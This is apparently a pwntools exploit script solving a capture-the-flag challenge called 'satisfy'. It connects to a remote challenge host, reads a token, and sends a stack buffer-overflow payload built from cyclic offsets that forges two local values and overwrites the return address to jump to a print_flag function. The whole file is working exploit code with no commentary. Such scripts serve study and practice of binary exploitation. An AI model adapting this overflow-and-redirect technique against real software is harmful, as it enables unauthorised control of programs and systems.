from pwn import *

local = False

if local:
    p = process("./satisfy")
    input("gdb")
    token = p.recv().strip().split()[-1]
else:
    p = remote("0.cloud.chals.io", 34720)
    m = p.recvuntil(b">>> ")
    token = m.split(b"\n")[-2].strip().split(b" ")[-1]

print(token)

token = int(token, 10)
target = 0x7a69

param1 = cyclic_find(b"gaaa")
param2 = cyclic_find(b"eaaa")

print_flag_addr = 0x4013aa


payload = cyclic(500)
payload = payload[:param2] + p64(0) + payload[param2 + 8:]
payload = payload[:param1] + p64(target ^ token) + payload[param1 + 8: ]
payload = payload[:cyclic_find(b"kaaa")] + p64(print_flag_addr)

p.sendline(payload)

p.interactive()
